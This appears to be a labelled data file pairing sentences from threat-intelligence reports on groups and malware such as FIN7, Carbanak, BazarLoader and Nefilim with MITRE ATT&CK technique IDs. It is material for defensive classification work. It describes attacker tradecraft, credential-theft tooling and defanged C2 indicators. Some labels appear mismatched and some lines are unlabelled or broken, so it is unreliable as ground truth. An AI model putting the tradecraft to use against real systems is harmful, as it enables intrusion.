Carbanak campaigns can also use legitimate programs and remote access software for command and control. They also employ standard non-application layer protocols for communication.	['T1095']
After this, the Carbanak backdoor can then be used to log keystrokes and capture screenshots, steal and delete cookies, inject malicious code on sites, and monitor various traffic. For lateral movement, the malware abuses remote and system administration tools.	['T1539', 'T1113', 'T1550.004', 'T1020.001', 'T1056.003']
For FIN7 attack routines, data can be compressed and/or encrypted before being exfiltrated.	['T1560']
FIN7 gathers information on network shares.	['T1039']
The other infection chain involves an attached .XLS file containing an Excel formula that utilizes a PowerShell command (Figure 2) to access paste.ee, a Pastebin alternative, that accesses a second encrypted PowerShell command (Figure 3).	['T1059', 'T1566.001', 'T1059.001']
In Carbanak attacks, the groups’ attacks can involve logging into services that accept remote connections and using stolen password hashes through the “pass the hash” method	['T1550.002', 'T1110.002']
On the other hand, FIN7 takes advantage of Mshta, a utility that can execute VBScript, and scheduled tasks to run malicious code on user systems.	['T1053.005', 'T1053', 'T1218.005']
In both Carbanak and FIN7 attacks, communication with users’ compromised systems is done through bypassing firewalls or network detection systems via commonly used ports, using connection proxies to avoid direct connections to the threat group’s infrastructure, employing the command-and-control channel to remotely copy files from an external system, blending in with existing network traffic by using standard application layer protocol, and taking advantage of standard cryptographic protocol to disguise command-and-control traffic.	['T1090']
Panda Stealer is deployed through spam emails posing as business quote requests to lure unwary victims into opening malicious Excel files. We have identified two infection chains: in one, an .XLSM attachment contains macros that download a loader (Figure 1). Then, the loader downloads and executes the main stealer. 	['T1598.002', 'T1566.001', 'T1137.001']
FIN7 attacks can and inject code into processes and hijack the search order used to load DLL files.	['T1574.001']
Decoding these PowerShell scripts revealed that they are used to access paste.ee URLs for easy implementation of fileless payloads. The CallByName export function in Visual Basic is used to call the load of a .NET assembly within memory from a paste.ee URL.	['T1059.005', 'T1059.001']
Carbanak also collects information on accounts, files and directories, group permissions, and registries.	['T1083']
FIN7 utilizes guardrails to restrict execution and abused utilities that allow indirect command execution that can go past security restrictions	['T1480']
After moving through the network and identifying assets to target, the next step would be to gather key data. At the collection phase, Carbanak and FIN7 campaigns harvest data from local system sources and through input and screen capture (as performed in a related campaign using the Tirion malware).	['T1113', 'T1056']
They also add programs to a startup folder that can be referenced with a registry run key. We detected a variant of the Carbanak malware that adds registry entries and keys as an autostart technique. Credentials of existing valid accounts were also abused.	['T1547.001']
Cobalt Strike was also used to continuously communicate with the main command-and-control (C&C) server.	['T1587.001', 'T1583.004']
This example of BazarLoader generated command and control (C2) activity, retrieving BazarBackdoor using HTTPS traffic from 104.248.174[.]225 over TCP port 443.	['T1043']
Use the latest attack patterns, Kubernetes (K8s) or Docker API targeting, which were featured in two reports focusing on TeamTNT operations, Black-T: New Cryptojacking Variant from TeamTNT and Hildegard: New TeamTNT Cryptojacking Malware Targeting Kubernetes.	['T1588.002']
The attacker then executed a persistent malicious PowerShell code that was used to download and execute another PowerShell backdoor file in the server from the malicious IP address 185[.]82[.]219[.]201, as shown in Figure 7.	['T1590.005', 'T1059.001', 'T1027.003', 'T1216', 'T1546.013', 'T1059', 'T1064']
The PowerShell command executed after the Microsoft Exchange exploitation is responsible for downloading and executing another PowerShell script from the command-and-control (C&C) server 185[.]82[.]219[.]201	['T1059', 'T1059.001', 'T1064', 'T1546.013', 'T1059.003']
This PowerShell backdoor was observed to be related to the SystemBC malware as a service. The script has a hard coded C&C server IP address and port number to connect to, with data passed to the “Rc4_crypt” function before connection.	['T1059.001']
In our case study, approximately two minutes after Cobalt Strike activity started, a tool to enumerate an AD environment appeared on the infected host at C:\ProgramData\AdFind.exe.	['T1588.002', 'T1595']
Our analysis shows that the Crimson RAT malware is compiled as a .NET binary with minimal obfuscation. This could indicate that the cybercriminal group behind this campaign is possibly not well-funded.	['T1140', 'T1001', 'T1588.001', 'T1587.001']
Earth Karkaddan actors are known to use the Crimson RAT malware in its campaigns to communicate with its command-and-control (C&C) server to download other malware or exfiltrate data.	['T1588.001', 'T1587.001', 'T1583.004']
After downloading and executing these files, one of the child processes created other files and the executable setup.exe/setup-installv1.3.exe, which was extracted from 320yea_Teamviewer_15206.zip via WinRAR.exe. This file seems to be the source of most of the downloaded malicious files, as seen in the following figure.	['T1204.002']
The BazarLoader DLL was immediately copied to another location and made persistent through the Windows registry	['T1547.001', 'T1112', 'T1543.003']
These infections provide backdoor access that criminals use to determine whether the host is part of an Active Directory (AD) environment. If so, criminals deploy Cobalt Strike and perform reconnaissance to map the network	['T1595', 'T1592']
The malicious Excel spreadsheet was discovered on Wednesday, Aug. 18, 2021, and it has a last modified date of Tuesday, Aug. 17. The filename had an .xlsb file extension. This file has macros designed to infect a vulnerable Windows host with BazarLoader. Figure 2 shows a screenshot of the Excel file.	['T1137.001', 'T1587.001', 'T1588.001']
Once the executable file is executed, it will proceed to unzip a file named mdkhm.zip and then execute a Crimson RAT executable named dlrarhsiva.exe.	['T1588.001']
BazarLoader is Windows-based malware spread through various methods involving email	['T1588.001', 'T1587.001', 'T1566.002', 'T1566.001', 'T1534', 'T1598.002', 'T1566']
The loaded module is a simple dropper. Upon loading the module, the AutoOpen method will be invoked. The malicious code in this method drops the final payload executable into %AppData%\service.exe and executes it (see Figure 6)	['T1574.005', 'T1574', 'T1569.002', 'T1543.003']
The spreadsheet’s macro code retrieved a malicious Dynamic Link Library (DLL) file for BazarLoader from the following URL	['T1204.001']
 this Excel template was created by a threat actor trying to instill confidence by taking advantage of the DocuSign brand name and image.	['T1137.001', 'T1221']
Crimson RAT can steal credentials from browsers, collect antivirus information, capture screenshots, and list victim drives, processes, and directories. We have observed how an infected host communicates with a Crimson RAT C&C server to send exfiltrated information including PC name, operating system (OS) information, and the location of the Crimson RAT malware inside the system.	['T1592', 'T1589', 'T1590', 'T1125', 'T1555.003', 'T1056', 'T1113', 'T1003']
Cobalt Strike leads to reconnaissance of an infected host’s environment. In our lab environments, this reconnaissance activity can start within a few minutes after Cobalt Strike traffic first appears.	['T1588.001', 'T1587.001']
In this case, a Cobalt Strike DLL file was sent through Bazar C2 traffic and saved to the infected Windows host under the user’s AppData\Roaming directory	['T1564.003']
Cobalt Strike is an adversary simulation platform developed for penetration testers by Raphael Mudge, founder of Strategic Cyber LLC. Designed for interoperability with other platforms such as Metasploit, NMAP, and Powershell Empire, it can be run using Armitage, a graphic user interface (GUI) developed by Mudge, initially for Metasploit. Armitage and Cobalt Strike are designed around a team server that allows for the sharing of information and the ability to direct and execute well-coordinated actions.	['T1061']
Even though network monitoring and detection capabilities do not come easy for many organizations, they can generally offer a high return on investment if implemented correctly. Malware has to contact its C2 server if it is to receive further instructions. This article will demonstrate how to detect this communication before threat actors accomplish their objectives. There are a couple of factors that we can utilize to fingerprint any suspicious traffic and subsequent infrastructure. Before we get into that part, we should first discuss what makes Cobalt Strike so versatile.	['T1102.002', 'T1102.003']
Fifteen minutes after domain enumeration, we observed successful lateral movement to two endpoints on the network. Ten minutes after lateral movement, a PowerShell Cobalt Strike loader executed as a service on a server. Even though the execution was not successful, the threat actors kept trying, a total of eight times, until it finally worked. Windows Defender real-time monitoring was then disabled, the LSASS.exe process was dumped using SysInternals ProcDump, and privilege was escalated to “SYSTEM” using named pipe impersonation. 	['T1569.002', 'T1068', 'T1546.013']
As days go by, more of the reported ransomware attacks turn out to be related to the new Pay2Key ransomware. The attacker followed the same procedure to gain a foothold, propagate and remotely control the infection within the compromised companies.	['T1189']
SUGARDUMP using SMTP for C2 communication – dated to late 2021-early 2022. This variant was downloaded from a known UNC3890 C2 (URL: hxxp://128.199.6[.]246/3-Video-VLC.exe), and is a slightly more advanced version with similar credential harvesting functionality. 	['T1041']
Trickbot is the most common malware distributed by Emotet, but it is not the only one. Qakbot is another type of malware frequently dropped on Emotet-infected Windows hosts.	['T1588.001']
Essentially, the TDSS botnet kad.dll module is more or less the same as cmd.dll in terms of control function. By running nodes.dat files containing a list of IP addresses of Kad clients in addition to ktzerlrules, which contains a command to download a new nodes.dat file from cybercriminal servers, the owners of the botnet can both include their infected computers in the publicly accessible Kad network and remove them from the network. The publicly accessible Kad network contains no more than 10 TDSS infected computers. This makes replacing the ktzerules file as inefficient as possible, which prevents other cybercriminals from taking control over the botnet. The total number of TDSS infected computers on the closed network number tens of thousands.	['T1059', 'T1588.001', 'T1587.001']
We can apply this same concept across other executable traits, such as BOOSTWRITE’s export DLL name (DWriteImpl.dll), to create quick and easy rules that can aid in quick discovery as seen in Figure 7.	['T1129']
HenBox attempts to hide itself from the app launcher view by running the following code, passing the parameters COMPONENT_ENABLED_STATE_DISABLED (2) and DONT_KILL_APP (1) to the setComponentEnabledSetting() method.	['T1564']
As our research technique of fingerprinting exploit writers exceeded our initial expectations, we were on the lookout for more exploits to investigate. Soon enough, we came across this blog post from Kaspersky detailing how Sodin (a.k.a Sodinokibi, or REvil), an infamous ransomware, is using a 1-Day exploit for CVE-2018-8453.	['T1588.006', 'T1203', 'T1210']
The first spear phish from group “Admin@338” was sent to a foreign government in the Asian Pacific region on March 10, 2014 – just two days after the flight disappeared. The threat actors sent a spear-phishing email with an attachment titled, “Malaysian Airlines MH370.doc” (MD5: 9c43a26fe4538a373b7f5921055ddeae). Although threat actors often include some sort of “decoy content” upon successful exploitation (that is, a document representing what the recipient expected to open), in this case, the user is simply shown a blank document.	['T1566.001', 'T1203', 'T1566']
However, for version 3 things are different.  This is how the report of the email_accounts_grabber module appears for Emotet version 3:	['T1129', 'T1588.001', 'T1586.002']
Skidmap, a Linux malware that we recently stumbled upon, demonstrates the increasing complexity of recent cryptocurrency-mining threats. This malware is notable because of the way it loads malicious kernel modules to keep its cryptocurrency mining operations under the radar.	['T1588.001']
APT3 (also known as UPS), the actors responsible for Operation Clandestine Fox has quietly continued to send waves of spearphishing messages over the past few months. This actor initiated their most recent campaign on November 19, 2014 targeting multiple organizations. The attacker leveraged multiple exploits, targeting both CVE-2014-6332 and CVE-2014-4113. CVE-2014-6332 was disclosed publicly on 2014-11-11 and is a Windows OLE Automation Array Remote Code Execution vulnerability. CVE-2014-4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14.	['T1587.004', 'T1566.003', 'T1534']
In March, we discovered a targeted campaign to distribute Milum, a Trojan designed to gain remote control of devices in target organizations, some of which operate in the industrial sector. The first signs of this operation, which we have dubbed WildPressure, can be traced back to August 2019; still, the campaign remains active. The Milum samples we have seen so far do not share any code similarities with any known APT campaigns. The malware provides attackers with remote control over infected devices, allows downloading and executing commands, collecting and exfiltrating information and installing upgrades in the malware.	['T1588.001']
We did not observe the initial access for this case but assess with medium to high confidence that a malicious email campaign was used to deliver an Excel (xls) document. Following the opening of the xls document, the initial Qbot DLL loader was downloaded and saved to disk. Interestingly, the name of the DLL contained a .html extension to disguise the portable executable nature of the payload. Once executed, the Qbot process creates a scheduled task to elevate itself to system.	['T1566.001', 'T1204.002', 'T1566.002']
Although there are no previously known malicious Android applications attributed to the StrongPity group, we strongly believe that the threat actor is in the process of actively developing new malicious components that can be used to target Android platforms.	['T1505']
SHA256 file hashes for 119 malspam attachments, 30 extracted Redaman executable files, and 30 dropped Redaman DLL files found from September through December 2018. Information is available at: https://github.com/pan-unit42/iocs/blob/master/Redaman_banking_malware/2018-09-thru-2018-12-file-hashes-for-Redaman-banking-malware.txt .	['T1566.001', 'T1598.002']
It’s clear from our research that the quality of the WannaCry code is poor and the developers made many mistakes, enabling many of those infected to recover encrypted data.  The way the attackers handled ransom payments limited their ability to capitalise on the spread of the worm.  Multiple attempts were made to track transactions to the bitcoin wallets used by the attackers.  Although estimates of how much money the attackers made vary, they run into tens of thousands, rather than hundreds .	['T1486']
According to our research partner in Japan, the original EvilPost attack in December 2015 arrived as a spear-phishing email with a Word document attached.	['T1566.001', 'T1598.002']
In early April, Emotet acquired a module for distribution over wireless networks (MD5: 75d65cea0a33d11a2a74c703dbd2ad99), which tried to access Wi-Fi using a dictionary attack. Its code resembled that of the Network Spreader module (bypass.exe), which had been supplemented with Wi-Fi connection capability. If the brute-force was successful, the module transmitted data about the network to C&C.	['T1588.001']
We investigated a long-running espionage campaign, dubbed A41APT, targeting multiple industries, including the Japanese manufacturing industry and its overseas bases, which has been active since March 2019. The attackers used vulnerabilities in an SSL-VPN product to deploy a multi-layered loader we dubbed Ecipekac (aka DESLoader, SigLoader and HEAVYHAND). We attribute this activity to APT10 with high confidence. Most of the discovered payloads deployed by this loader are fileless and have not been seen before. We observed SodaMaster (aka DelfsCake, dfls and DARKTOWN), P8RAT (aka GreetCake and HEAVYPOT), and FYAnti (aka DILLJUICE Stage 2) which in turn loads QuasarRAT. In November and December 2020, two public blog posts were published about this campaign. One month later, we observed new activities from the actor with an updated version of some of their implants designed to evade security products and make analysis harder for researchers. You can read more in our public report.	['T1588.001', 'T1588.006']
Along with the HTTP part, the binary part was also updated. The encryption remained the same, but Emotet dropped Google Protocol Buffer and switched to its own format. The compression algorithm also changed, with zlib replaced by liblzf. More details about the new protocol can be found in the Threat Intel and CERT Polska reports.	['T1048.003']
In November 2018, Cisco Talos published research on an attack campaign named DNSpionage. It involved attacks using malware to compromise individual endpoints, but most interestingly described an effort to specifically hijack DNS entries of government organizations to redirect visitors to likely malicious, adversary operated systems. Both FireEye and Crowdstrike followed up with their own assessments for the DNS hijacking efforts, and described operations extending back to January 2017. No attribution to any known adversary groups was provided, other than that the target radius was primarily in the Middle East and the adversary was also likely operating out of that region. 	['T1584.002', 'T1583.002', 'T1496', 'T1189']
Although the targeting profile is the same as the Russian banking cluster, the TTPs are very different. In particular, the use of tooling stands out from other clusters of CARBON SPIDER activity. As with other clusters, the primary infection vector is targeted spear phishing emails that use exploits for a variety of vulnerabilities in Microsoft Office:	['T1203', 'T1588.006', 'T1566']
1) Function similarity – Important functions in both BYEBY and wincore.dll have almost the same implementation. One such function is the payloads’ main thread function.	['T1588.001', 'T1055.003']
Another indicator of a Qakbot infection is HTTPS traffic to cdn.speedof[.]me. The domain speedof[.]me is used by a legitimate Internet speed test service. Although this is not malicious traffic, we frequently see traffic to cdn.speedof[.]me during Qakbot infections. Figure 20 shows this activity from our pcap.	['T1090.004']
Malicious use of Responder was first publicly documented on August 11, 2017 as being used by APT28, also known as Fancy Bear. The tool was used against hotel visitors to spoof NetBios resources. Victims were coerced into connecting to UDP port 137 and disclosing credentials over SMB to APT28, which the threat actor then used to gain elevated access to the network.	['T1557.001', 'T1043', 'T1021.002']
With the amount of overlap between the other components in these separate campaigns, we decided to compare the Pirpi payloads delivered by the UPS group using CVE-2014-1776 and CVE-2015-3113. From here on, we will refer to these two payloads as Pirpi.2014 (CVE-2014-1776) and Pirpi.2015 (CVE-2015-3113), whose details are listed in Table 1. Unit 42 discovered several similarities between the two Pirpi variants, as well as a few equally important differences, both of which are worth discussing. We also compared the Pirpi.2014 and Pirpi.2015 payloads to other known Pirpi samples in an attempt to determine which variant they most closely resemble.	['T1588.006']
Next we compared the codebase for setting registry keys. The code reuse displayed in Figure 4 is the sequence that sets the IEHarden registry keys and other keys used throughout TidePool and Operation Ke3chang malware.	['T1547.001', 'T1112']
Another infamous banker Trojan, Kronos, caught up with Edge in 2016. We checked out its capabilities on a Windows 10 virtual machine. In the code of the new Kronos version we found a function that checks the name and checksum of a process, as well as the hashes of the functions hooked by the malware.	['T1056.004']
CARROTBALL, initially discovered in an attack during October 2019, is a simple FTP downloader utility which facilitates the installation of SYSCON, a full-featured Remote Access Trojan (RAT) which leverages FTP for Command and Control (C2). It was found embedded in a malicious Word document sent as a phishing lure to a US government agency and two non-US foreign nationals professionally associated with North Korea.	['T1059', 'T1566']
The success of the Dropping Elephant group is striking given that no zero-day exploits or advanced techniques were used to target high-profile victims – it’s clear that by applying security updates and improving the security awareness of staff, the success of attacks like this can be prevented. At the start of the year we predicted that APT groups would invest less effort in developing sophisticated tools and make greater use of off-the-shelf malware. Dropping Elephant provides a further example of how low investment and use of ready-made toolsets can be very effective when combined with high quality social engineering.	['T1587.001']
In my previous blog, I noted that a variant of the Cerber downloader was seen using BITS for a brief period of time and 10 out of these 11 samples were Microsoft Word documents leading to Cerber.	['T1197']
In early 2015, a new Emotet modification was released, not all that different from the previous one. Among the changes were: new built-in public RSA key, most strings encrypted, ATS scripts for web injection cleared of comments, targets included clients of Swiss banks.	['T1592.004']
A C&C address (103.82.52[.]18) which was found in one of MosaicRegressor’s variants (MD5:3B58E122D9E17121416B146DAAB4DB9D) was observed in use by the ‘Winnti umbrella and linked groups’, according to a publicly available report. Since this is the only link between our findings and any of the groups using the Winnti backdoor, we estimate with low confidence that it is indeed responsible for the attacks.	['T1587.001']
Both MPK variants include key loggers that are extremely similar in functionality in addition to having the same strings used for headers within the key log file. The MPK IRC Bot monitors active application windows and writes the title of the open window along with the logged keystrokes to a file at “%temp%\Save.tmp”. The MPK Trojan also monitors specifically for windows that are likely to contain login forms for popular web-based email clients, such as titles that contain:	['T1554']
AveMaria is a new botnet, whose first version we found in September 2018, right after the arrests of the FIN7 members. We have medium confidence that this botnet falls under the FIN7 umbrella. In fact, AveMaria is a classic infostealer bot that collects all possible credentials from various types of software: browsers, email clients, messengers, etc., and can act as a keylogger. Since the beginning of 2019, we have collected more than 1300 samples and extracted more than 130 C2s.	['T1114', 'T1587.001']
. . MuddyWater has conducted various campaigns against entities spread throughout the U.S.A, Europe, Middle East and South Asia.. . A typical TTP employed by the group is the heavy use of scripting in their infection chains using languages like PowerShell and Visual Basic coupled with the frequent use of living-of-the-land binaries (LoLBins).. . Cisco Talos recently observed a campaign operated by MuddyWater targeting users in Turkey. This campaign consists of the use of malicious PDFs and Microsoft Office documents (maldocs) to serve as the initial infection vector. These maldocs were named in such a way as to masquerade as legitimate documents from the Turkish Health and Interior Ministries.. . Next, the malware executes a series of scripts deployed on the infected endpoint to serve as downloaders and instrumentors for additional payloads.. . We've also discovered the use of flags or tokens in attacks conducted by this threat actor in this campaign. These tokens are meant to signal a successful infection of a target by the group's malicious artifacts.. . . . 	['T1203']
Pony is a popular downloader program that can download additional malware onto the infected system. It is also equipped with a number of plugins that may be used to steal stored credentials for various applications such as FTP clients, web browsers, email clients, and other software. Pony is also commonly known as Fareit.	['T1539', 'T1555']
In recent years, malware delivery mechanisms have changed from fixed media (diskettes) to email (e.g. the infamous LoveLetter email worm) and direct network attacks (e.g. CodeRed). The most recent step in the evolution process is a move to delivering malware via the world wide web.	['T1102']
We determined the string in the pre tags is the actor provided password, which the webshell uses as a key to decrypt the embedded payload. We determined this by following the process in which the TwoFace++ loader webshell uses the actor provided password to authenticate and decrypt the embedded webshell:	['T1552.004']
We found a Coinminer bundled with the legitimate installer of video conferencing app Zoom, luring users who want to install the software but end up unwittingly downloading a malicious file. The compromised files are not from Zoom’s official download center, and are assumed to come from fraudulent websites. We have been working with Zoom to ensure that they are able to communicate this to their users appropriately.	['T1588.001', 'T1554', 'T1195.002', 'T1574.005']
In August 2019, FireEye released the “Double Dragon” report on our newest graduated threat group, APT41. A China-nexus dual espionage and financially-focused group, APT41 targets industries such as gaming, healthcare, high-tech, higher education, telecommunications, and travel services. APT41 is known to adapt quickly to changes and detections within victim environments, often recompiling malware within hours of incident responder activity. In multiple situations, we also identified APT41 utilizing recently-disclosed vulnerabilities, often weaponzing and exploiting within a matter of days.	['T1595.002', 'T1046']
Most modifications of Trojan.Win32.Waldek are distributed via removable media and include functionality to collect information on infected systems and send it to the attackers.

FormBook authors did some rewrites on the original exploit, taking as their initial codebase the one that we and Microsoft observed as deploying Cobalt Strike beacons.  The exploited vulnerability is CVE-2021-40444. However, since the vulnerability itself has been analyzed already, here we focus on describing some of the unique changes made by FormBook.	['T1203']
The 2019 Linux variant of the GoldMax backdoor is almost identical in functionality and implementation to the previously identified May 2020 Windows variant. The very few additions to the backdoor between 2019 and 2020 likely reflect its maturity and longstanding evasion of detections. It is likely GoldMax has been used as a long-term persistence backdoor during StellarParticle-related compromises, which would be consistent with the few changes made to the malware to modify existing functions or support additional functionality.

As the Top Twenty shows, DNSChanger is also widespread. There is actually a connection between Zlob and DNSChanger – we believe they were created by the same gang. Although DNSChanger underwent many changes during its lifespan, basically what it does is simply change the DNS servers from the user’s computer to a set of two specific IP addresses. The IP addresses are selected from a huge pool and the variation comes in distributing thousand of different DNSChanger binaries, each one setting the DNS servers to distinct IP addresses. While changing the DNS servers may not be regarded as something seriously malicious, an attacker who achieves this can actually do a lot of harm – for instance, redirecting websites such as Amazon.com or Bank Of America to phishing installations almost entirely without any sign of warning to the user. To complicate removal, the most recent DNSChangers include rootkit components and even download additional malware.	['T1014']
The group’s arsenal at that point included multiple Trojans and tools for Windows and macOS. In 2015, the actors started to expand their espionage efforts from PCs to mobile devices using the spyware called MobileOrder, which focused on compromising Android devices. Based on the code similarity, shared infrastructure and victimology, we conclude that the new wave of attacks belongs to the same threat actor and that the group continues to deploy and develop MobileOrder malware until this day. In addition to clear code overlaps, we observed multiple overlaps in the infrastructure between the new samples and the old MobileOrder malware variant, as well as multiple variants of Windows Psylo Trojan previously attributed to Scarlet Mimic, that interact with the same malicious domains as the mobile malware.

The downloader’s process termination starts with killing the DDG Monero miner botnet client if present on the system, followed by a variety of other cryptominers, including other XMRig instances. This behavior is indicative of attempting to secure more host resources from competing miners. The malware also targets services belonging to Qihoo 360, an antivirus service, in order to reduce the chance of detection. However, taskkill is unable to to kill process related to Qihoo 360. Figure 5 shows the processes that the script attempts to terminate.	['T1057', 'T1518.001']

FIN13 rolled many of these reconnaissance efforts into scripts to automate their processes. For example, they used pi.bat to iterate through a list of IP addresses in a file, execute a ping command and write the output to a file (Figure 6). A similar script used dnscmd to export a host’s DNS zones to a file.	['T1595.001', 'T1059.003']

After the botnets of direct ZeuS successors were taken down, Dridex’s time came. This malware is a result of Bugat evolution (which appeared in 2010). Bugat v5 was recognized as Dridex in 2014.	['T1587.001']
The injected wermgr.exe process then creates a new folder in the user’s AppData directory. As typically seen in Trickbot infections, it drops a copy of itself into this folder along with its encrypted config (settings.ini) and a batch file (launcher.bat). 	['T1055']
"A sample of the data that is encrypted and sent to the CnC server for version ‘p=2’ is seen in the memory dump shown in Figure 6. At offset 4-7 it contains a time-based counter. It uses the keyword ""osamu"" in this instance to identify this particular campaign. The campaign keywords are not sent out in version ‘p=1’ but can still be found hardcoded in the DLL payload. The hostname and OS information are also included in the beacon. It awaits further commands from the CnC server in response to the data sent out."	['T1082']
The dropper extracts the communications and wiper components from resources named “PKCS7” and “PKCS12” respectively, while the x86 sample extracts the x64 variant of Disttrack from a resource named “X509”. To extract the components, the dropper is configured to seek specific offsets within the resource, read a specified number of bytes and decrypt the contents using a specified key. The key exists in the sample as a base64 encoded string that the dropper will decode then use each byte of the resulting string to XOR the data obtained from the resource. When determining the location of the ciphertext within the resource, the dropper subtracts 14 from the offset value in the sample’s configuration as an additional layer of obfuscation. Table 1 shows the resources within the Disttrack x86 sample, the component it contains and the values needed to decrypt its contents.	['T1132']
It appears Russian cyber criminals were equally perplexed by the WCry campaign as the rest of the world.

The malicious library completes malware installation. Specifically, it creates a registry value responsible for automatically running RMS at system startup. Notably, in most cases of this campaign the registry value is placed in the RunOnce key, instead of the Run key, enabling the malware to run automatically only the next time the system starts up. After that, the malware needs to create the registry value again.	['T1547.001', 'T1547.001']

Last March, we reported a WildPressure campaign targeting industrial-related entities in the Middle East. While tracking this threat actor in spring 2021, we discovered a newer version. It contains the C++ Milum Trojan, a corresponding VBScript variant and a set of modules that include an orchestrator and three plugins. This confirms our previous assumption that there were more last-stagers besides the C++ ones.	['T1587.001']

And finally, a mention of Trojan-Downloader.Win32.CWS.j, another common site on malicious websites. This downloader is basically a small stub which downloads and installs variants of CWS, perhaps better known as CoolWebSearch. CoolWebSearch is a malicious program which was first reported circa 2003. Ever since, a huge number of variants have been found in the wild, most of them following the same pattern of hijacking the browser startup page and displaying pornographic pop-ups. Over time, CWS variants have become more and more complex and the latest versions include rootkit stealth components and retro features designed to terminate antivirus programs.

The Russian-speaking APT group Turla (known variously as ‘Snake’, ‘Uroburos’, ‘Venomous Bear’ and ‘KRYPTON’) has been active since at least 2007 (and maybe even longer). Its activities have been traced to many high-profile incidents, including the 2008 attack against the US Central Command (the Buckshot Yankee incident) and, more recently, the attack against the Swiss military contractor, RUAG. We’ve discuss its activities on a number of occasions (here, here, here and here). The group intensified its activities in 2014, targeting Ukraine, EU-related institutions, governments of EU countries, global foreign affairs ministries, media companies and possibly corruption-related targets in Russia. In 2015 and 2016 the group diversified its activities, switching from the Epic Turla watering-hole framework to the Gloog Turla framework, which is still active. The group also expanded its spear-phishing activities with the Skipper/WhiteAtlas attacks, which made use of new malware. Recently, the group has intensified its satellite-based C2 registrations ten-fold compared to the 2015 average.	['T1587.001']
BONDUPDATER waits to receive an instruction from the C2 server that starts with “E” before writing the downloaded data to the supplied filename. After receiving the “E” instruction, the Trojan will write the base64 decoded data to the file and process the newly created file. Figure 27 shows the C2 server providing the “E” instruction within the TXT answer. In the current example, the Trojan would treat the newly saved file as a script thanks to the filename ending with the “0” character. The Trojan would run the contents of the file using “cmd.exe” and save the output to a file named “proc10100” that will be uploaded to the C2 server.	['T1059.003']
Based on posts on an underground forum, we believe that the developer of Chthonic supplies binaries to other cyber-criminals and rents out the C2 infrastructure. Therefore, this distribution of victims likely represents several otherwise unconnected cyber-crime operations.	['T1588.001', 'T1583']
When the news broke in 2014 about a new sophisticated threat actor dubbed the Turla Group, which the Estonian foreign intelligence service believes has Russian origins and operates on behalf of the FSB, its kernelmode malware also became the first publicly-described case that abused a third-party device driver to disable Driver Signature Enforcement (DSE). This security mechanism was introduced in Windows Vista to prevent unsigned drivers from loading into kernel space. Turla exploited the signed VirtualBox driver, VBoxDrv.sys v1.6.2, to deactivate DSE and load its unsigned payload drivers afterward.	['T1211']
Since December 2017 security researchers have been seeing samples of MS Office documents in spearphishing emails related to the Winter Olympics uploaded to VirusTotal.

Interestingly, the ChChes samples we observed were digitally signed using a certificate originally used by HackingTeam and later part of the data leaked when they were themselves hacked. Wapack labs also observed a similar sample targeting Japan in November. It’s not clear why the attackers chose to use this certificate, as it was old, had been leaked online, and had already been revoked by the time they used it. Digital certificates are typically used because they afford an air of legitimacy, which this one definitely does not.	['T1596.003']
The authors of Black Lambert included a couple of very interesting details in the sample, which read as the following: toolType=wl, build=132914, versionName = 2.0.0. Looking for similar samples, we were able to identify another generation of related tools which we called White Lambert. While Black Lambert connects directly to its C&C for instructions, White Lambert is a fully passive, network-driven backdoor.	['T1587.001']
In Figure 4, the first DNS query to resolve is. . yFIOr645245444143544544.windows64x[.]com which acts as an initial beacon. The first five characters (yFIOr) are random and have no purpose other than generating random subdomains in order to avoid DNS caching. The next two characters (64) signify the Hex notation of the d request type, which is the request type for the initial beacon as noted in Table 3.

When users run the malicious CHM file, the HTM file’s code is executed. The script decompiles the CHM file through hh.exe and runs LBTWiz32.exe. It then creates a normal image file (KBSI_SNS_003.jpg) on the PC screen, making it difficult for users to recognize malicious behaviors.	['T1218']
LBTWiz32.exe that is run is a normal program. However, the malicious DLL (LBTServ.dll) created on the same path through DLL hijacking is loaded and starts operating. The malicious DLL creates and executes a malicious VBE file (ReVBShell) in the %TEMP% folder. Figures 2 to 4 show parts of the decoded VBE code.	['T1574']
Mimikatz creates a new server and nTDSDSA objects in the Active Directory forest Configuration partition. Next, it updates the SPN (Service Principal Name) of the computer hosting the rogue domain controller to “GC” (Global Catalog) and “E3514235-4B06-11D1-AB04-00C04FC2DCD2” (Active Directory Replication). The rogue domain controller is now registered and capable of replicating data to other domain controllers.	['T1207']
this is a late-stage kill chain attack that allows a threat actor with admin (domain or enterprise admin) credentials to leverage the replication mechanism in AD to register a rogue domain controller in order to inject backdoor changes to an AD domain. With that rogue DC, the attacker can manipulate AD data, including objects, and schemas.	['T1207']
With DCShadow, attackers no longer have to replicate data, but can register new domain controllers in the targeted infrastructure to inject backdoor changes in AD objects, or alter existing ones by replacing the attributes’ values.	['T1207']
If an attacker has domain admin permissions, he can steal the DC backup key and as a result, decrypt all the domain users’ master keys. The Mimikatz module allowing to extract the domain backup key is lsadump::backupkeys. This module first calls the API functions LsaOpenPolicy with POLICY_GET_PRIVATE_INFORMATION as the DesiredAccess argument, so it will be able to call the function LsaRetrievePrivateData after-	['T1207']
The Nefilim ransomware creates a new wermgr.exe (the Windows error reporting manager) process and injects its payload to evade process-based defenses.	['T1055']
Nefilim uses WerFault.exe and wermgr.exe for DLL Side Loading, a defense evasion technique used by adversaries to execute malicious payloads by hijacking the library manifest used to load DLLs. Werfault.exe is the Windows Error Reporting binary used by many different programs to report errors.	['T1574.002']
"Nefilim uses the following  ‘timeout’ command to delay the execution of the ‘del’ command. Adversaries use this command also to evade sandbox analysis. C:\Windows\System32\cmd.exe"" /c timeout /t 3 /nobreak"""	['T1497.003']
The Nefilim ransomware uses IsDebuggerPresent, CheckRemoteDebuggerPresent, and NtQueryInformationProcess API functions to check if a user-mode debugger is running. Debuggers are used by security analysts to inspect malware’s behavior at the run-time. In the presence of a debugger,  malware samples exhibited less malicious behavior. Moreover, Nefilim uses the NtSetInformationThread API function to evade debugging.	['T1518.001']
Nefilim reads the hosts file (C:\Windows\System32\drivers\etc\hosts) to get a listing of other systems by IP addresses and hostnames on the network that may be used for Lateral Movement from the current system.	['T1018']
The Nefilim ransomware downloads the Psexec.exe tool, and it also abuses the Windows built-in WMI (Windows Management Instrumentation) utility for lateral movement. PsExec is a free Microsoft tool that can be used to execute commands and binaries on remote systems and download or upload a file over a network share. Nefilim uses PsExec and WMI with hard-coded admin credentials to remotely execute the batch files and the ransomware file in remote hosts.	['T1570']
The Nefilim ransomware creates a DirectInput object using the DirectDrawCreateEx function to capture keystrokes. Keylogging is both a Credential Access and Collection tactic.	['T1056.001']
